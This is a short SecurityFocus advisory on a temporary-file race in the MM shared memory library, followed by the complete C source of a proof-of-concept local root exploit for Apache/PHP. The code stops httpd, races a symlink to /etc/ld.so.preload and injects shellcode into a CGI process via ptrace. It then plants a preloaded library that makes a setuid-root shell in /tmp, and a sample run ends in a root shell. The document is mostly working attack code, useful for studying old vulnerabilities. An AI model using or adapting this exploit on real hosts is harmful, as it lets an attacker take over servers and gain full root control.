source: http://www.securityfocus.com/bid/5352/info

The MM Shared Memory library is reported to be prone to a race condition with regards to temporary files which may enable a local attacker to gain elevated privileges. This issue may reportedly be exploited by an attacker with shell access as the Apache webserver user to gain root privileges on a vulnerable host. 

/*** scalpel.c -- local apache/PHP root via libmm (apache-user -> root)
 ***
 *** (C) 2002 Sebastian Krahmer proof of concept exploit.
 ***
 *** Exploiting conditions:
 ***
 *** Apache is linked against libmm which has /tmp races.
 *** Upon Apache start or restart code is executed like
 *** unlink("/tmp/session_mm.sem"); open("/tmp/session_mm.sem", O_RDWR|O_CREAT).
 *** If attacker exploited any CGI or PHP script remotely he gained
 *** apache-user and can go one step further to get root by:
 ***
 *** 1) STOPing all httpd's and bring root to execute /etc/rc.d/apache restart
 ***    Its very likely root does so because webserver just doesnt work anymore
 ***    (all childs are STOPed). One can also send him fake-mail
 ***    from httpd-watchdog that he has to invoke the command.
 *** 2) Install signal-handler and using 2.4 directory notifying to see when
 ***    /tmp/session_mm.sem is unlinked. Create link to /etc/ld.so.preload
 ***    immediately which makes Apache creating that file.
 *** 3) Trigger execution of a CGI script where Apache leaks a descriptor
 ***    (r+w) to /etc/ld.so.preload to the child.
 *** 4) Ptrace that script, inject code which writes content to preload-file.
 *** 5) Execute suid-helper to execute code as root.
 ***
 *** Note in 4) that we cant ptrace httpd alone because it setuid'ed from root
 *** to apache-user thus setting id-changed flag. By triggering execve() of
 *** a CGI script this flag is cleared and we can hijack process.
 ***
 *** assert(must-be-apache-user && must-have-a-cgi-script-installed &&
 ***        must-bring-root-to-restart-apache);
 ***
 ***
 *** wwwrun@liane:~> cc scalpel.c -Wall
 *** wwwrun@liane:~> ./a.out /cgi-bin/genindex.pl
 *** httpd(2368): Operation not permitted
 *** Creating /tmp/boomsh
 *** Creating /tmp/boomso
 *** Installed signal-handler. Waiting for apache restart.
 *** ++++++Forking off proc-scan to attach to CGI-script.
 *** Triggering CGI: /cgi-bin/genindex.pl
 *** Got cgi-bin PID 2460
 *** Injecting of write-code finished.
 *** blub
 *** +sh-2.05# id
 *** uid=0(root) gid=65534(nogroup) groups=65534(nogroup)
 *** sh-2.05#
 ***/

#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <signal.h>
#include <sys/stat.h>
#include <dirent.h>
#include <sys/types.h>
#include <string.h>
#include <errno.h>
#include <sys/ptrace.h>
#include <asm/ptrace.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <netdb.h>
#include <stdlib.h>
#include <sys/wait.h>

/* Please do not complain about ugly code; its a 1h exploit.
 * For good code see crypto-pty for example ;-)
 */
int create_link()
{
	symlink("/etc/ld.so.preload", "/tmp/session_mm.sem");
	return 0;
}


void die(char *s)
{
	perror(s);
	exit(errno);
}

void sig_x(int x)
{
	create_link();
	printf("+");
}


void usage()
{
	printf("Usage: scalpel <cgi-script>\n\n"
	       "i.e. ./scalpel /cgi-bin/moo.cgi\n");
	exit(1);
}

int scan_proc()
{
	int lastpid, fd, i, pid, done = 0;
	unsigned int eip;
	char fname[1024];
	char code[] = 
		"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
		"\xe8\x10\x00\x00\x00\x2f\x74\x6d\x70\x2f\x62\x6f"
		"\x6f\x6d\x73\x68\x2e\x73\x6f\x0a\x00\xb8\x04\x00"
		"\x00\x00\xbb\x05\x00\x00\x00\x59\xba\x0f\x00\x00"
		"\x00\xcd\x80\xb8\x01\x00\x00\x00\x31\xdb\xcd\x80";
	unsigned long *p;

	printf("Forking off proc-scan to attach to CGI-script.\n");

	if (fork() > 0)
		return 0;

	lastpid = getpid();

	while (!done) {
		for (i = 0; i < 100; ++i) {
			snprintf(fname, sizeof(fname), "/proc/%d/cmdline", lastpid+i);
			if ((fd = open(fname, O_RDONLY)) < 0)
				continue;
			read(fd, fname, sizeof(fname));
			close(fd);
			if (strcmp(fname, "/usr/bin/perl") == 0) {
				if (ptrace(PTRACE_ATTACH, lastpid+i,0,0) < 0) {
					pid = lastpid+i;
					done = 1;
					break;
				}
			}
		}
	}
			
	printf("Got cgi-bin PID %d\n", pid);

	waitpid(pid, NULL, 0);

	eip = ptrace(PTRACE_PEEKUSER, pid, 4*EIP, 0);
	if (errno)
		die("ptrace");
	for (p = (unsigned long*)code; i < sizeof(code); i+= 4, ++p) {
		if (ptrace(PTRACE_POKETEXT, pid, eip + i, *p) < 0)
			die("ptrace");
	}

	if (ptrace(PTRACE_POKEUSER, pid, 4*EIP, eip+4) < 0)
		die("ptrace");

	if (ptrace(PTRACE_DETACH, pid, 0, 0) < 0)
		die("ptrace");
	printf("Injecting of write-code finished.\n");
	exit(0);
}


int tcp_connect(const char *host, u_short port)
{
	int sock;
	struct hostent *he;
	struct sockaddr_in sin;

	if ((sock = socket(PF_INET, SOCK_STREAM, 0)) < 0)
		die("sock");

	if ((he = gethostbyname(host)) == NULL) {
		herror("gethostbyname");
		exit(EXIT_FAILURE);
	}

	memset(&sin, 0, sizeof(sin));
	memcpy(&sin.sin_addr, he->h_addr, he->h_length);
	sin.sin_family = AF_INET;
	sin.sin_port = port == 0 ? htons(80):htons(port);

	if (connect(sock, (struct sockaddr*)&sin, sizeof(sin)) < 0) {
		close(sock);
		return -1;
	}
	return sock;
}


int trigger_cgi(const char *cgi)
{
	char cmd[1024];
	int sock = tcp_connect("127.0.0.1", 80);

	printf("Triggering CGI: %s\n", cgi);

	snprintf(cmd, sizeof(cmd), "GET %s HTTP/1.0\r\n\r\n", cgi);
	if (write(sock, cmd, strlen(cmd)) < 0)
		die("write");
	sleep(1);
	close(sock);
	return 0;
}

int create_boomsh()
{
	FILE *f = fopen("/tmp/boomsh.c", "w+");

	printf("Creating /tmp/boomsh\n");
	if (!f)
		die("fopen");
	fprintf(f, "#include <stdio.h>\nint main()\n{\nchar *a[]={\"/bin/sh\",0};"
		   "setuid(0); execve(*a, a, NULL);return 1;}\n");
	fclose(f);
	system("gcc /tmp/boomsh.c -o /tmp/boomsh");
	return 0;
}


int create_boomso()
{
	FILE *f = fopen("/tmp/boomso.c", "w+");

	printf("Creating /tmp/boomso\n");
	if (!f)
		die("fopen");
	fprintf(f, "#include <stdio.h>\nvoid _init(){if (geteuid()) return;printf(\"blub\n\");"
		   "chown(\"/tmp/boomsh\",0, 0); chmod(\"/tmp/boomsh\", 04755);"
	           "unlink(\"/etc/ld.so.preload\");exit(0);}");
	fclose(f);
	system("gcc -c -fPIC /tmp/boomso.c -o /tmp/boomso.o;"
	       "ld -Bshareable /tmp/boomso.o -o /tmp/boomsh.so");
	return 0;
}


int main(int argc, char **argv)
{
	int fd;
	struct stat st;
	char *cgi = NULL;
	extern char **environ;
	char *boomsh[] = {"/tmp/boomsh", NULL};
	char *suid[] = {"/bin/su", NULL};

	if (argc < 2)
		usage();

	cgi = strdup(argv[1]);

	setbuffer(stdout, NULL, 0);

	system("killall -STOP httpd");

	create_boomsh();
	create_boomso();

	if ((fd = open("/tmp", O_RDONLY|O_DIRECTORY)) < 0) {
		return -1;
	}

	if (fcntl(fd, F_SETSIG, SIGUSR1) < 0) {
		return -1;
	}

	if (fcntl(fd, F_NOTIFY, DN_MODIFY|DN_DELETE|DN_RENAME|DN_ATTRIB
			       |DN_CREATE|DN_MULTISHOT|DN_ACCESS) < 0) {
		return -1;
	}
	
	signal(SIGUSR1, sig_x);

	printf("Installed signal-handler. Waiting for apache restart.\n");

	/* wait for /etc/ld.so.preload to apear */
	while (stat("/etc/ld.so.preload", &st) < 0)
		sleep(1);


	/* forks off daemon */
	scan_proc();

	/* Trigger execution of a CGI-script */
	trigger_cgi(cgi);

	for(;;) {
		sleep(1);
		memset(&st, 0,sizeof(st));
		stat("/etc/ld.so.preload", &st);
		if (st.st_size > 0)
			break;
		if (stat("/tmp/boomsh", &st) == 0 && st.st_uid == 0)
			break;
	}

	/* Apropriate content is in /etc/ld.so.preload now */
	if (fork() == 0) {
		execve(*suid, suid, NULL);
		exit(1);
	}
	sleep(3);
	execve(*boomsh, boomsh, environ);

	return 0;
}